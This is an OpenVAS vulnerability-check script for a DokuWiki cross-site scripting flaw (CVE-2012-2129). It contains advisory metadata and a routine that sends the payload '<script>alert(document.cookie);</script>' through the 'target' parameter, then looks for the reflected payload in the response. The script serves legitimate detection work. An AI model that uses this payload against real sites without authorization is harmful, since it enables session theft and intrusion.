##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dokuwiki_target_param_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# DokuWiki 'target' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "DokuWiki version 2012-01-25 and prior";
tag_insight = "The input passed via 'target' parameter to 'doku.php' script (when 'do' is
  set to 'edit') is not properly validated, which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.";
tag_solution = "Upgrade to DokuWiki version 2012-01-25a or later
  For updates refer to http://www.splitbrain.org/projects/dokuwiki";
tag_summary = "This host is running DokuWiki and is prone to cross site scripting
  vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803008";
CPE = "cpe:/a:dokuwiki:dokuwiki";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-2129");
  script_bugtraq_id(53041);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-28 11:26:53 +0530 (Tue, 28 Aug 2012)");
  script_name("DokuWiki 'target' Parameter Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check if DokuWiki is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dokuwiki_detect.nasl");
  script_require_keys("dokuwiki/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.osvdb.org/81355");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48848");
  script_xref(name : "URL" , value : "http://ircrash.com/uploads/dokuwiki.txt");
  script_xref(name : "URL" , value : "https://bugs.dokuwiki.org/index.php?do=details&amp;task_id=2487");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111939/DocuWiki-2012-01-25-Cross-Site-Request-Forgery-Cross-Site-Scripting.html");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

## Variable Initialization
port = 0;
dir = "";
url = "";

## Get dokuwiki port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check the port state
if(!get_port_state(port)){
  exit(0);
}

## Get DokuWiki dir
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Construct the Attack Request
url = dir + "/doku.php?do=edit&id=S9F8W2A&target=<script>alert"+
            "(document.cookie);</script>";

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url,
                   pattern:"<script>alert\(document.cookie\);</script>", check_header:TRUE,
                   extra_check:'content="DokuWiki"/>')){
  security_warning(port);
}
